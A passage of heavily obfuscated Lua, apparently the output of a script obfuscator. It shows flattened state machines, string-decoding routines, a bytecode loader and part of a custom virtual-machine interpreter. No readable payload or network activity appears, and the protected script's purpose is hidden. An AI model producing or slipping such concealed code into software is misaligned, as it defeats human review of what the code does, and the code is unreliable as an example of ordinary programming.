s*(1/0);else return(s*(0/0));end;end;else if 7<a then break else return(s*2^(q-1023))*((d+(p/(2^52))))end end end end a=a+1 end end else cj=(-1671+(function()local a,b,c,d,p,q,s,v,w,x,y,be,bf,bg,bh,bi,bj,bk,bs,bw,by,bz,ca,cc,ce,cs,ct,cu,cv,cw,cx,cy,cz=0 while true do if a<=15 then if a<=7 then if a<=3 then if a<=1 then if a<1 then b=409 else c=818 end else if a~=3 then d=28939 else p=222 end end else if a<=5 then if a>4 then s=38485 else q=389 end else if a==6 then v=1166 else w=583 end end end else if a<=11 then if a<=9 then if 9~=a then x=9454 else y=425 end else if a~=11 then be=4509 else bf=442 end end else if a<=13 then if 13~=a then bg=292 else bh=3 end else if 15~=a then bi=1696 else bj=848 end end end end else if a<=23 then if a<=19 then if a<=17 then if 16<a then bs=10108 else bk=579 end else if a>18 then by=908 else bw=252 end end else if a<=21 then if a<21 then bz=5205 else ca=470 end else if a~=23 then cc=746 else ce=1816 end end end else if a<=27 then if a<=25 then if 25~=a then cs=18568 else ct=2 end else if 27>a then cu=1 else cv=421 end end else if a<=29 then if a==28 then cw=0 else cx,cy=cw,cu end else if a<=30 then cz=(function(da,db,dc,dd)local de=0 while true do if de~=1 then da(db(dd,dd,dc,dd),dc(db,da,db,dd),dc(dc,db,dc,dc),dd(db and da,dd,dc,dc))else break end de=de+1 end end)(function(da,db,dc,dd)local de=0 while true do if de<=2 then if de<=0 then if(cx>cv)then local cv=cw while true do cv=(cv+cu)if((cv<ct))then return db else break end end end else if 1==de then cx=(cx+cu)else cy=((cy+cc))%cs end end else if de<=3 then if((cy%ce)==by or(cy%ce)>by)then local by=cw while true do by=by+cu if(not(by~=cu)or by<cu)then cy=(cy-ca)%bz else if not(not(by==ct))then return db(da(dc,da,da,((db and dc))),dc(db,db,da,((dc and dd))),dc(da,dd,da,dc),((da(dc,(dd and db),(db and dc),da)and da((dc and dd),(dc and da),dd,dc))))else break end end end else local by=cw while true do by=by+cu if not((by~=ct))then break else return da end end end else if de~=5 then return db else break end end end de=de+1 end end,function(by,bz,cc,ce)local cs=0 while true do if cs<=2 then if cs<=0 then if(cx>bw)then local bw=cw while true do bw=(bw+cu)if not(bw~=ct)then break else return by end end end else if cs>1 then cy=(((cy-bk)%bs))else cx=cx+cu end end else if cs<=3 then if(((cy%bi)==bj)or(cy%bi)>bj)then local bi=cw while true do bi=bi+cu if((not(bi~=ct)or(bi>ct)))then if(bi<bh)then return cc else break end else cy=((cy*bg)%be)end end else local be=cw while true do be=(be+cu)if((be<ct))then return by(bz(ce and bz,by and bz,((cc and by)),by),(ce(bz,ce,bz,(cc and ce))and cc(cc,ce,cc,cc)),(cc(ce,by and ce,by,ce)and bz(by,by and by,cc,bz)),cc(cc,ce,((bz and ce)),cc))else break end end end else if cs~=5 then return by(cc(cc,bz,cc and by,ce),ce(cc,cc,ce,by),by(ce,ce,bz,by),bz(by,((by and by)),cc,ce))else break end end end cs=cs+1 end end,function(be,bg,bi,bj)local bk=0 while true do if bk<=2 then if bk<=0 then if(cx>bf)then local bf=cw while true do bf=(bf+cu)if(bf<ct)then return bj else break end end end else if bk==1 then cx=cx+cu else cy=(((cy+y)%x))end end else if bk<=3 then if(((cy%v))>w or(cy%v)==w)then local v=cw while true do v=((v+cu))if(v<cu or v==cu)then cy=(((cy-ca)%s))else if not(not(v==bh))then break else return bj end end end else local s=cw while true do s=((s+cu))if not(not(s==ct))then break else return bi(be(bi,((be and bi)),bg,bj),((bj(bi,be,bg,bi)and bg(bj,bj and bi,bg,bi and bj))),bi(bg,bi,be,bi),bg(bg,bj,bg,bg))end end end else if bk~=5 then return be(bi((bg and bj),bg,(bg and be),((bj and bi))),bj(be,bi,bj,bi),bj(bj and bi,((bi and bi)),bg,bi),be(bi,bj,bg,bj))else break end end end bk=bk+1 end end,function(s,v,w,x)local y=0 while true do if y<=2 then if y<=0 then if cx>q then local q=cw while true do q=(q+cu)if(q<ct)then return x else break end end end else if y<2 then cx=cx+cu else cy=((cy*p)%d)end end else if y<=3 then if((cy%c)>b)then local b=cw while true do b=(b+cu)if(b<ct)then return s(w(x,s,s,((v and w))),(s(s,w,v,(v and s))and x(v,x,x,v)),v(s,x,s,((w and s))),w(s,w,s,w)and s(v,w,s,(s and x)))else break end end else local b=cw while true do b=b+cu if not(not(b==ct))then break else return v end end end else if 5~=y then return x else break end end end y=y+1 end end)else if 32~=a then return cy;else break end end end end end end a=a+1 end end)());end else if bd<=29 then cl="\46"else if 30<bd then cn=cf else cm=function()local a,b,c=0 while true do if a<=1 then if 0==a then b,c=h(bn,br,br+2)else b,c=bu(b,cb),bu(c,cb);end else if a<=2 then br=br+2;else if a==3 then return(bv(c,8))+b;else break end end end a=a+1 end end end end end else if bd<=33 then if bd~=33 then co=function()local a,b,c,d,p=0 while true do if a<=2 then if a<=0 then b=g else if a>1 then d=0 else c=157 end end else if a<=3 then p={}else if 5~=a then while(d<8)do d=d+1;while d<707 and c%1622<811 do c=(((c*35)))local q=d+c if((c%16522)<8261)then c=((c*19))while(((d<828))and c%658<329)do c=(((c+60)))local q=d+c if(((c%18428))==9214 or((c%18428))<9214)then c=(((c-50)))local q=10701 if not p[q]then p[q]=1;local q,s=cn(),g;if not((q~=0))then return g;end;b=j(bn,br,(br+q-1));br=((br+q));return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s<2 then while true do if 0<v then break else return i(h(q))end v=v+1 end else break end end s=s+1 end end);end elseif((c%4~=0))then c=((c-67))local q=33140 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s>1 then break else while true do if(v~=1)then return i(h(q))else break end v=(v+1)end end end s=s+1 end end);end else c=((c*88))d=(d+1)local q=92657 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s>1 then break else while true do if(1>v)then return i(h(q))else break end v=v+1 end end end s=s+1 end end);end end;d=((d+1));end elseif not(c%4==0)then c=((c-48))while((d<859)and c%1392<696)do c=((c*39))local q=(d+c)if((c%58)<29)then c=(((c+5)))local q=33930 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 1==s then while true do if(v>0)then break else return i(h(q))end v=v+1 end else break end end s=s+1 end end);end elseif not(not(c%4~=0))then c=((c*56))local q=35370 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s<2 then while true do if v>0 then break else return i(h(q))end v=v+1 end else break end end s=s+1 end end);end else c=((c*9))d=(d+1)local q=96267 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 1==s then while true do if 1~=v then return i(h(q))else break end v=v+1 end else break end end s=s+1 end end);end end;d=(d+1);end else c=(((c-51)))d=(d+1)while((d<663)and(((c%936)<468)))do c=((c*12))local q=((d+c))if(((c%18532)==9266 or(c%18532)>9266))then c=(c*71)local q=7037 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 2>s then while true do if(v>0)then break else return i(h(q))end v=v+1 end else break end end s=s+1 end end);end elseif not(not(c%4~=0))then c=(c-18)local q=90882 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 1<s then break else while true do if not(1==v)then return i(h(q))else break end v=(v+1)end end end s=s+1 end end);end else c=((c*35))d=(d+1)local q=41573 if not p[q]then p[q]=1;return z(b,cl,function(b)local p,q=0 while true do if p<=0 then q=0 else if p<2 then while true do if(q==0)then return i(h(b))else break end q=(q+1)end else break end end p=p+1 end end);end end;d=d+1;end end;d=d+1;end c=(c-494)if(d>43)then break;end;end;else break end end end a=a+1 end end else cp=cf end else if bd<=34 then cq=function(...)local a=0 while true do if a<1 then return{...},n("\35",...)else break end a=a+1 end end else if bd>35 then break else cr=function()local a,b,c,d,p,q,s,v,w,x=0 while true do if a<=9 then if a<=4 then if a<=1 then if a==0 then b,c,d,p={},{},{},{}else q=m({[ch]=b,nil,[ci]=c,nil,[776]=p,[345]=bb,[536]=nil},{['\95\95\116\111\115\116\114\105\110\103']=function(...)return j(bn,br,br);end,})end else if a<=2 then s={}else if a<4 then v=490 else w=0 end end end else if a<=6 then if a==5 then x={}else while(w<3)do w=((w+1));while(w<481 and v%320<160)do v=((v*62))local d=w+v if((v%916)>458)then v=(((v-88)))while(w<318)and v%702<351 do v=(((v*8)))local d=((w+v))if((v%14064)>7032)then v=(v*81)local d=58084 if not x[d]then x[d]=1;s[cf()]=nil;end elseif v%4~=0 then v=((v*37))local d=93269 if not x[d]then x[d]=1;s[cf()]=nil;end else v=((v+10))w=((w+1))local d=78058 if not x[d]then x[d]=1;for d=1,cf()do local j=cg();if(not(not(j==3)))then s[d]=nil;elseif(not((j~=1)))then s[d]=(not((cg()==0)));elseif((j==2))then s[d]=ck();elseif(not(not(j==0)))then s[d]=co();end;end;q[cj]=s;end end;w=w+1;end elseif not(not((v%4)~=0))then v=((v*65))while((w<615)and(v%618<309))do v=(v-33)local d=w+v if(((v%15582)>7791))then v=((v*14))local d=31092 if not x[d]then x[d]=1;s[cf()]=nil;end elseif not(not((v%4)~=0))then v=(((v+51)))local d=68285 if not x[d]then x[d]=1;s[cf()]=nil;end else v=((v+53))w=((w+1))local d=64266 if not x[d]then x[d]=1;s[cf()]=nil;end end;w=(w+1);end else v=(v+7)w=(w+1)while((w<127 and v%1548<774))do v=((v-37))local d=((w+v))if(((v%19188)>9594))then v=(((v*61)))local d=73351 if not x[d]then x[d]=1;s[cf()]=nil;end elseif not(not(v%4~=0))then v=(v+25)local d=78934 if not x[d]then x[d]=1;s[cf()]=nil;end else v=((v+42))w=((w+1))local d=62692 if not x[d]then x[d]=1;s[cf()]=nil;end end;w=((w+1));end end;w=(w+1);end v=((v*482))if(w>56)then break;end;end;end else if a<=7 then q[481]=cg();else if 9~=a then v=184 else w=0 end end end end else if a<=14 then if a<=11 then if a>10 then while w<9 do w=w+1;while((w<70)and((v%1134)<567))do v=(((v*43)))local d=(w+v)if(v%3948)<1974 then v=((v*88))while((w<519)and v%1626<813)do v=(((v*2)))local d=(w+v)if(((v%16054))<8027)then v=((v*60))local d=99054 if not x[d]then x[d]=1;end elseif v%4~=0 then v=((v+56))local d=55173 if not x[d]then x[d]=1;end else v=(v-45)w=w+1 local d=59122 if not x[d]then x[d]=1;local d=1;local j=2;local p=3;local y=4;for y=1,cf()do local bb=cg();local be=cd(bb,d,d);if(not(not(be==0)))then local bb,be,bf=cd(bb,j,p),cd(bb,4,6),m({[195]=cm(),[469]=cm(),nil,nil},{['\95\95\116\111\115\116\114\105\110\103']=function(...)return cd(bb,j,p);end,})if(((bb==0)or(bb==d)))then bf[345]=cf();if((bb==0))then bf[491]=cf();end;elseif((not(bb~=j))or(not(bb~=p)))then bf[345]=(((cf()-(e))));if(not(not(bb==p)))then bf[491]=cm();end;end;if(not(not(cd(be,d,d)==d)))then bf[469]=s[bf[469]];end;if(not(not(not(cd(be,j,j)~=d))))then bf[345]=s[bf[345]];end;if(not((cd(be,p,p)~=d)))then bf[491]=s[bf[491]];end;b[y]=bf;end;end;end end;w=(w+1);end elseif not(not((v%4)~=0))then v=((v*44))while w<318 and v%1850<925 do v=((v+47))local b=w+v if(not(((v%8346))~=4173)or((v%8346)<4173))then v=(v+20)local b=1485 if not x[b]then x[b]=1;end elseif not(not(((v%4))~=0))then v=(v-66)local b=76732 if not x[b]then x[b]=1;end else v=(((v+74)))w=w+1 local b=67479 if not x[b]then x[b]=1;end end;w=((w+1));end else v=((v+84))w=w+1 while(((w<929)and((v%1722)<861)))do v=((v*2))local b=((w+v))if((v%11100)>5550)then v=(((v*42)))local b=66569 if not x[b]then x[b]=1;end elseif not((v%4)==0)then v=((v*62))local b=98847 if not x[b]then x[b]=1;end else v=(v+3)w=w+1 local b=89214 if not x[b]then x[b]=1;end end;w=(w+1);end end;w=(w+1);end v=(((v*717)))if((w>77))then break;end;end;else x={}end else if a<=12 then for b=1,cf()do c[b-1]=cr();end;else if a==13 then do for b=1,#q[ch]do local b=q[ch][b]local c,d,e=b[469],b[345],b[491]if not(not(not(bp(c)~=f)))then c=z(c,cl,function(j,p,p,p)local p,s=0 while true do if p<=0 then s=0 else if p~=2 then while true do if(s<1)then return i(bu(h(j),cb))else break end s=s+1 end else break end end p=p+1 end end)b[469]=c end if not(not(bp(d)==f))then d=z(d,cl,function(c,j,j,j,j)local j,p=0 while true do if j<=0 then p=0 else if 1<j then break else while true do if p<1 then return i(bu(h(c),cb))else break end p=p+1 end end end j=j+1 end end)b[345]=d end if(not((bp(e)~=f)))then e=z(e,cl,function(c,d,d,d)local d,j=0 while true do if d<=0 then j=0 else if d>1 then break else while true do if 1>j then return i(bu(h(c),cb))else break end j=j+1 end end end d=d+1 end end)b[491]=e end;end;q[cj]=nil;end;else v=656 end end end else if a<=16 then if 15==a then w=0 else x={}end else if a<=17 then while w<6 do w=w+1;while(w<956 and(v%316)<158)do v=((v*53))local b=(w+v)if((((v%1836))<918 or((v%1836))==918))then v=(v*49)while((w<820)and(v%1328<664))do v=(v*34)local b=((w+v))if((v%12312)<6156)then v=(v*65)local b=26870 if not x[b]then x[b]=1;return q end elseif v%4~=0 then v=(v*30)local b=40141 if not x[b]then x[b]=1;return q end else v=((v-87))w=(w+1)local b=55551 if not x[b]then x[b]=1;return q end end;w=((w+1));end elseif not(not((v%4)~=0))then v=(v-22)while(w<90)and(((v%1108))<554)do v=((v*17))local b=w+v if((v%5282)==2641 or(v%5282)<2641)then v=((v*81))local b=96006 if not x[b]then x[b]=1;return q end elseif not(not((v%4)~=0))then v=((v+11))local b=76494 if not x[b]then x[b]=1;return q end else v=(((v-38)))w=w+1 local b=40886 if not x[b]then x[b]=1;return q end end;w=(w+1);end else v=(((v-45)))w=w+1 while((w<94)and(v%1362)<681)do v=(v+67)local b=((w+v))if((((v%1362))<681))then v=(v-6)local b=61677 if not x[b]then x[b]=1;return q end elseif not(not((v%4)~=0))then v=(v+53)local b=96426 if not x[b]then x[b]=1;q[536]=function(...)local b,c,d,e,h=0 while true do if b<=0 then c,d,e,h=0 else if 1<b then break else while true do if c<=2 then if c<=0 then d=n(1,...)else if(1==c)then e=({...})else do for d=0,#e do if not((bp(e[d])~=bq))then for i,i in o,e[d]do if not((bp(i)~=bp(g)))then t(bo,i)end end else t(bo,e[d])end end end end end else if(c<3 or c==3)then h=function(d)local i,j,p=0 while true do if i<=0 then j,p=0 else if i<2 then while true do if(j<1 or j==1)then if not(j~=0)then p=u(d)else for p=0,#bo do if ba(d,bo[p])then return bm(f);end end end else if not(j==3)then return false else break end end j=j+1 end else break end end i=i+1 end end else if not(4~=c)then for d=0,#e do if not(not(bp(e[d])==bq))then return h(e[d])end end else break end end end c=c+1 end end end b=b+1 end end end else v=(((v+47)))w=(w+1)local b=81474 if not x[b]then x[b]=1;return q end end;w=(w+1);end end;w=(w+1);end v=((v*46))if(w>57)then break;end;end;else if 18==a then return q;else break end end end end end a=a+1 end end end end end end end end bd=bd+1 end local function a(b,c)local d if bp(l)==bq then d=l;else d=l(bl);end local e={}for f,h in o,d do if h~=b then e[f]=h else e[f]=c;end end if bc then return bc(bl,e)else l=e;return l;end end;local function b(...)local c=n(bl,...);local d=c[ci];local e=c[536];local f=c[ch];local h=n(2,...);local i=c[345];local j=n(3,...);local o=c[481];local c=c[776];local c=bt[ba(bx,i)];return function(...)local i,n,p,q,s,u,v,w=cq,1,-1,{},{...},(n("\35",...)-1),{},{};for x=0,u,1 do if(x>=o)then q[x-o]=s[x+1];else w[x]=s[x+1];end;end;local x,y,z,ba=(u-o+1),nil,nil,{};while true do y=f[n];z=y[195];if 188>=z then if 93>=z then if z<=46 then if z<=22 then if z<=10 then if z<=4 then if z<=1 then if 1>z then local ba;w[y[469]]=j[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];ba=y[469]w[ba]=w[ba](r(w,ba+1,y[345]))else local ba=y[469];local bb,bc,bd=w[ba],w[ba+1],w[ba+2];local bb=bb+bd;w[ba]=bb;if bd>0 and bb<=bc or bd<0 and bb>=bc then n=y[345];w[ba+3]=bb;end;end;elseif z<=2 then local ba;w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]]*y[491];n=n+1;y=f[n];w[y[469]]=w[y[345]]+w[y[491]];n=n+1;y=f[n];w[y[469]]=j[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]]+w[y[491]];n=n+1;y=f[n];ba=y[469]w[ba]=w[ba](r(w,ba+1,y[345]))elseif z<4 then if(w[y[469]]~=w[y[491]])then n=y[345];else n=n+1;end;else w[y[469]][w[y[345]]]=w[y[491]];end;elseif 7>=z then if 5>=z then local ba,bb=0 while true do if ba<=8 then if ba<=3 then if ba<=1 then if ba~=1 then bb=nil else w[y[469]]=w[y[345]][y[491]];end else if ba<3 then n=n+1;else y=f[n];end end else if ba<=5 then if 5~=ba then w[y[469]]=h[y[345]];else n=n+1;end else if ba<=6 then y=f[n];else if ba==7 then w[y[469]]=w[y[345]][w[y[491]]];else n=n+1;end end end end else if ba<=13 then if ba<=10 then if 10>ba then y=f[n];else w[y[469]]=h[y[345]];end else if ba<=11 then n=n+1;else if 13~=ba then y=f[n];else w[y[469]]=w[y[345]][y[491]];end end end else if ba<=15 then if ba~=15 then n=n+1;else y=f[n];end else if ba<=16 then bb=y[469]else if ba==17 then w[bb]=w[bb](r(w,bb+1,y[345]))else break end end end end end ba=ba+1 end elseif 7~=z then local ba;w[y[469]]=w[y[345]];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];ba=y[469]w[ba]=w[ba](r(w,ba+1,y[345]))else local ba;w={};for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];ba=y[469]w[ba]=w[ba](r(w,ba+1,y[345]))end;elseif 8>=z then local ba=y[469];local bb=y[491];local bc=ba+2;local bd={w[ba](w[ba+1],w[bc])};for be=1,bb do w[bc+be]=bd[be];end local ba=w[ba+3];if ba then w[bc]=ba;n=y[345];else n=n+1 end;elseif 9==z then w[y[469]]=w[y[345]][y[491]];else local ba;w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];ba=y[469]w[ba]=w[ba](r(w,ba+1,y[345]))end;elseif 16>=z then if 13>=z then if 11>=z then local ba=y[469];p=((ba+x)-1);for bb=ba,p do local ba=q[bb-ba];w[bb]=ba;end;elseif 12==z then w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][w[y[491]]];n=n+1;y=f[n];if(w[y[469]]~=y[491])then n=n+1;else n=y[345];end;else local ba;local bb,bc;local bd;w[y[469]]=j[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];bd=y[469]bb,bc=i(w[bd](r(w,bd+1,y[345])))p=bc+bd-1 ba=0;for bc=bd,p do ba=ba+1;w[bc]=bb[ba];end;end;elseif z<=14 then local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if ba==0 then bb=nil else bc=nil end else if ba<=2 then bd=nil else if ba~=4 then w[y[469]]=h[y[345]];else n=n+1;end end end else if ba<=6 then if ba>5 then w[y[469]]=h[y[345]];else y=f[n];end else if ba<=7 then n=n+1;else if ba~=9 then y=f[n];else w[y[469]]=w[y[345]][y[491]];end end end end else if ba<=14 then if ba<=11 then if ba<11 then n=n+1;else y=f[n];end else if ba<=12 then w[y[469]]=w[y[345]][w[y[491]]];else if 13<ba then y=f[n];else n=n+1;end end end else if ba<=16 then if 16>ba then bd=y[469]else bc={w[bd](w[bd+1])};end else if ba<=17 then bb=0;else if 19>ba then for be=bd,y[491]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end elseif 16~=z then local ba;local bb;local bc;w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];bc=y[345];bb=y[491];ba=k(w,g,bc,bb);w[y[469]]=ba;else local ba;local bb;local bc;w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][w[y[491]]];n=n+1;y=f[n];bc=y[469]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[491]do ba=ba+1;w[bd]=bb[ba];end end;elseif z<=19 then if(17>=z)then local ba=y[469];w[ba]=(w[ba]-w[(ba+2)]);n=y[345];elseif(18<z)then local ba,bb,bc,bd=0 while true do if ba<=15 then if ba<=7 then if ba<=3 then if ba<=1 then if ba>0 then bc=nil else bb=nil end else if 3~=ba then bd=nil else w[y[469]]=h[y[345]];end end else if ba<=5 then if ba<5 then n=n+1;else y=f[n];end else if ba~=7 then w[y[469]]=w[y[345]][y[491]];else n=n+1;end end end else if ba<=11 then if ba<=9 then if 8<ba then w[y[469]]=h[y[345]];else y=f[n];end else if ba~=11 then n=n+1;else y=f[n];end end else if ba<=13 then if ba>12 then n=n+1;else w[y[469]]=w[y[345]][y[491]];end else if 15~=ba then y=f[n];else w[y[469]]=w[y[345]][w[y[491]]];end end end end else if ba<=23 then if ba<=19 then if ba<=17 then if 16<ba then y=f[n];else n=n+1;end else if ba~=19 then w[y[469]]=h[y[345]];else n=n+1;end end else if ba<=21 then if ba==20 then y=f[n];else w[y[469]]=w[y[345]][y[491]];end else if ba==22 then n=n+1;else y=f[n];end end end else if ba<=27 then if ba<=25 then if ba==24 then w[y[469]]=w[y[345]][y[491]];else n=n+1;end else if 27>ba then y=f[n];else bd=y[345];end end else if ba<=29 then if ba~=29 then bc=y[491];else bb=k(w,g,bd,bc);end else if 30<ba then break else w[y[469]]=bb;end end end end end ba=ba+1 end else local ba=y[469];local bb=w[ba];for bc=(ba+1),p do t(bb,w[bc])end;end;elseif z<=20 then local ba;w[y[469]]=j[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];ba=y[469]w[ba]=w[ba](w[ba+1])elseif 21==z then local ba;local bb;w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=w[y[345]][w[y[491]]];n=n+1;y=f[n];w[y[469]]=j[y[345]];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=w[y[345]][w[y[491]]];n=n+1;y=f[n];w[y[469]]=j[y[345]];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];bb=y[469];ba=w[y[345]];w[bb+1]=ba;w[bb]=ba[w[y[491]]];else local ba;local bb;local bc;w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][w[y[491]]];n=n+1;y=f[n];bc=y[469]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[491]do ba=ba+1;w[bd]=bb[ba];end end;elseif z<=34 then if z<=28 then if z<=25 then if z<=23 then w[y[469]]=#w[y[345]];elseif z~=25 then w[y[469]]=w[y[345]][w[y[491]]];else local ba;local bb;local bc;w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][w[y[491]]];n=n+1;y=f[n];bc=y[469]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[491]do ba=ba+1;w[bd]=bb[ba];end end;elseif z<=26 then w[y[469]]=y[345];elseif z<28 then local ba;local bb;local bc;w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][w[y[491]]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];bc=y[345];bb=y[491];ba=k(w,g,bc,bb);w[y[469]]=ba;else local ba;w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]]*y[491];n=n+1;y=f[n];w[y[469]]=w[y[345]]+w[y[491]];n=n+1;y=f[n];w[y[469]]=j[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]]+w[y[491]];n=n+1;y=f[n];ba=y[469]w[ba]=w[ba](r(w,ba+1,y[345]))end;elseif z<=31 then if(29>z or 29==z)then if(not(w[y[469]]==w[y[491]]))then n=n+1;else n=y[345];end;elseif 31~=z then local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if ba<1 then bb=nil else bc=nil end else if ba<=2 then bd=nil else if 3<ba then n=n+1;else w[y[469]]=h[y[345]];end end end else if ba<=6 then if ba~=6 then y=f[n];else w[y[469]]=h[y[345]];end else if ba<=7 then n=n+1;else if ba~=9 then y=f[n];else w[y[469]]=w[y[345]][y[491]];end end end end else if ba<=14 then if ba<=11 then if ba<11 then n=n+1;else y=f[n];end else if ba<=12 then w[y[469]]=w[y[345]][w[y[491]]];else if ba>13 then y=f[n];else n=n+1;end end end else if ba<=16 then if ba~=16 then bd=y[469]else bc={w[bd](w[bd+1])};end else if ba<=17 then bb=0;else if 18==ba then for be=bd,y[491]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end else w[y[469]]=j[y[345]];end;elseif z<=32 then w[y[469]][w[y[345]]]=w[y[491]];elseif z==33 then local ba=y[469]local bb={}for bc=1,#v do local bd=v[bc]for be=1,#bd do local bd=bd[be]local be,be=bd[1],bd[2]if be>=ba then bb[be]=w[be]bd[1]=bb v[bc]=nil;end end end else local ba;w={};for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=j[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];ba=y[469]w[ba]=w[ba](r(w,ba+1,y[345]))end;elseif z<=40 then if(z<=37)then if(z<35 or z==35)then local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if ba~=1 then bb=nil else w[y[469]]=w[y[345]];end else if 3>ba then n=n+1;else y=f[n];end end else if ba<=5 then if 4<ba then n=n+1;else w[y[469]]=y[345];end else if 6==ba then y=f[n];else w[y[469]]=y[345];end end end else if ba<=11 then if ba<=9 then if 9~=ba then n=n+1;else y=f[n];end else if ba>10 then n=n+1;else w[y[469]]=y[345];end end else if ba<=13 then if ba<13 then y=f[n];else bb=y[469]end else if ba>14 then break else w[bb]=w[bb](r(w,bb+1,y[345]))end end end end ba=ba+1 end elseif not(36~=z)then local ba=y[469]w[ba]=w[ba](r(w,(ba+1),p))else local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if ba>0 then w[y[469]]=w[y[345]][y[491]];else bb=nil end else if ba==2 then n=n+1;else y=f[n];end end else if ba<=5 then if 5~=ba then w[y[469]]=y[345];else n=n+1;end else if ba~=7 then y=f[n];else w[y[469]]=y[345];end end end else if ba<=11 then if ba<=9 then if ba>8 then y=f[n];else n=n+1;end else if 10==ba then w[y[469]]=y[345];else n=n+1;end end else if ba<=13 then if 12==ba then y=f[n];else bb=y[469]end else if ba<15 then w[bb]=w[bb](r(w,bb+1,y[345]))else break end end end end 